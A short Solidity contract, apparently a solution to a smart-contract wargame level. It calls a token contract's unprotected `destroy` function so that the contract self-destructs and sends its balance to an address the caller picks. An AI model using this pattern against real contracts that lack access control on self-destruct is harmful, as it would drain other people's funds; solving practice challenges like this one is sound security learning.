pragma solidity ^0.6.0;

interface SimpleToken {
  function destroy(address) external;
}

contract henloPlsGetMyBitcoinBack {
  SimpleToken st;

  constructor(address _addr) public {
    st = SimpleToken(_addr);
  }

  function recover(address payable _to) public {
    st.destroy(_to);
  }
}

